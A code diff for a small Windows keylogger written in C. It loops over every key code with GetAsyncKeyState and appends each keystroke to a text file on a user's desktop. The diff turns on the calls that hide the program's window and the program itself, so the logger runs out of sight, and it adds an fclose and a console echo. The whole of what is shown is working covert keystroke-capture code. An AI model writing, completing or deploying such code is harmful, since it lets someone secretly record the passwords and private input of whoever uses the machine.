@@ -8,10 +8,10 @@ int fileExists(char *file);
 void hideProgram();
 
 int main(int argc, char* argv[])
-{	
-	// ShowWindow(GetForegroundWindow(), SW_HIDE);
-	// hideProgram(argv[0]);
-	
+{
+	ShowWindow(GetForegroundWindow(), SW_HIDE);
+	hideProgram(argv[0]);	
+
 	while(1)
 	{
 		Sleep(1);
@@ -24,17 +24,19 @@ int main(int argc, char* argv[])
 void getWords()
 {	
 	int resultado, tecla;
-	FILE *file;
-	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a+");
-	
+	FILE *file = NULL;
+	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a");
+
 	for(tecla = 0; tecla <= 255; tecla++)
 	{
 		resultado = GetAsyncKeyState(tecla);
 
 		if(resultado == -32767) {
 			fprintf(file,"%c",tecla);
+			printf("%c",tecla);
 		}
 	}
+	fclose(file);
 }
 
 void hideProgram(char* file)
